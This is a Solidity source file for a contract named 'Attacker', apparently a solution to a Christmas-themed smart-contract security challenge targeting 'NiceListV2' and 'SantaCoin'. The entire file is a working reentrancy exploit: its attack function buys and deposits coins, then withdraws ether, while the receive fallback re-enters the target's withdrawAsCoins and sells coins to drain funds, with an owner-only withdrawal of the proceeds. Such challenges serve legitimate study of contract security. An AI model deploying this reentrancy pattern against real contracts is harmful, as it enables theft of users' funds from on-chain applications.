pragma solidity ^0.8.9;

import "./NiceListV2.sol";
import "./SantaCoin.sol";

contract Attacker {
    NiceListV2 public niceListV2;
    SantaCoin public santaCoin;
    address public owner;

    constructor(NiceListV2 _niceListV2, SantaCoin _santaCoin) {
        niceListV2 = _niceListV2;
        santaCoin = _santaCoin;
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(owner == msg.sender);
        _;
    }

    function fundContract() external payable {}

    function attack(uint256 amount) public {
        santaCoin.buyCoins{value: amount}();
        santaCoin.increaseAllowance(address(niceListV2), amount);
        niceListV2.buyIn(amount);
        niceListV2.withdrawAsEther(amount);
    }

    function withdraw(uint256 amount) public onlyOwner {
        payable(msg.sender).call{value: amount}("");
    }

    receive() external payable {
        if (msg.sender == address(niceListV2)) {
            niceListV2.withdrawAsCoins(msg.value);
            santaCoin.sellCoins(msg.value);
        }
    }
}
